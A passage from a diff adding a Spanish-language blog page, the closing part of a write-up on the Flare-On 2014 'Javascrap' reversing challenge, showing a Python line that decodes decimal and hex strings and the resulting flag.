+print regex_hex.sub(replace_hex, regex_dec.sub(replace_dec, line2))
+</code></pre>
+
+<p>Esto resuelve los encoding y nos devuelve los siguientes strings:</p>
+
+<p><img src="/img/flareon-2014-challenge-02/decode-dec-and-hex.png" alt="decode dec and hex" /></p>
+
+<p>Si sustituimos DOT, AT y DASH en &ldquo;a11DOTthatDOTjava5crapATflareDASHonDOTcom&rdquo; tenemos &ldquo;a11.that.java5crap@flare-on.com&rdquo;, la cual conforma la flag del reto.</p>
+
+<h3 id="flag-a11-that-java5crap-flare-on-com"><strong>flag: a11.that.java5crap@flare-on.com</strong></h3>
+
+<hr />
+
+<p>Espero que les haya gustado.</p>
+
+<p>Saludos,</p>
+
+    </section>
+
+    
+    <section class="post-tags" style="padding-bottom:60px;">
+        <div class="post-meta tags">
+            <i class="fa fa-fw fa-tag"></i>
+            
+                
+                <a href="https://xbytemx.github.io/tags/flareon">flareon </a>
+            
+                
+                <a href="https://xbytemx.github.io/tags/revisitado">revisitado </a>
+            
+                
+                <a href="https://xbytemx.github.io/tags/flareon2014">flareon2014 </a>
+            
+                
+                <a href="https://xbytemx.github.io/tags/javascript">javascript </a>
+            
+                
+                <a href="https://xbytemx.github.io/tags/reversing">reversing </a>
+            
+                
+                <a href="https://xbytemx.github.io/tags/writeup">writeup </a>
+            
+        </div>
+    </section>
+    
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "xbytemx" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    <section class="share">
+    <p class="backtotop"><a data-scroll href="#site-head"><i class="fa fa-lg fa-fw fa-angle-double-up"></i></a><a data-scroll class="backtotoptext" href="#site-head"> Back to top</a></p>
+    <p class="info prompt">Share</p>
+    <a href="http://twitter.com/share?text=Flare-on%202014%20-%20Challenge%2002%3a%20Javascrap&url=https%3a%2f%2fxbytemx.github.io%2fpost%2f2018-10-24-flareon-2014-challenge-02%2f" title="Share on Twitter"
+        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="fa fa-2x fa-fw fa-twitter-square"></i> <span class="hidden">Twitter</span>
+    </a>
+    <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fxbytemx.github.io%2fpost%2f2018-10-24-flareon-2014-challenge-02%2f" title="Share on Facebook"
+        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="fa fa-2x fa-fw fa-facebook-square" style="margin-left: -8px"></i> <span class="hidden">Facebook</span>
+    </a>
+    <a href="https://plus.google.com/share?url=https%3a%2f%2fxbytemx.github.io%2fpost%2f2018-10-24-flareon-2014-challenge-02%2f" title="Share on Google+"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <i class="fa fa-2x fa-fw fa-google-plus-square" style="margin-left: -8px"></i> <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    <footer class="post-footer">
+        <section class="author">
+    <div class="authorimage" style="background: url(https://xbytemx.github.io/img/avatar.jpg)"></div>
+    <h4>Tony Palma</h4>
+    <p class="bio">Yo solo toque la computadora y solita se apago</p>
+    <p class="meta">
+      
+    </p>
+</section>
+    </footer>
+    
+</article>
+
+    </main>
+
+    <footer class="site-footer">
+	<div class="inner">
+		<section class="footer-social">
+      
+      <a href="//twitter.com/xbytemx" target="_blank" title="Twitter"><i class="fa fa-2x fa-fw fa-twitter"></i> <span class="hidden">Twitter</span></a>&nbsp;
+      
+      
+      
+      
+      
+      
+      <a href="//github.com/xbytemx" target="_blank" title="GitHub"><i class="fa fa-2x fa-fw fa-github"></i> <span class="hidden">GitHub</span></a>&nbsp;
+      
+      
+      
+      
+  </section>
+
+		<section class="copyright">&copy; 2018 <a href="https://xbytemx.github.io/">Tony Palma</a>. Released under the MIT license.</section>
+	</div>
+</footer>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src="https://xbytemx.github.io/js/index.js"></script>
+<script src="https://xbytemx.github.io/js/smooth-scroll.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
+
+
+<script>
+    smoothScroll.init({
+        speed: 800,
+        easing: 'easeInOutCubic',
+        updateURL: false,
+        offset: 125,
+    });
+</script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+</body>
+</html>
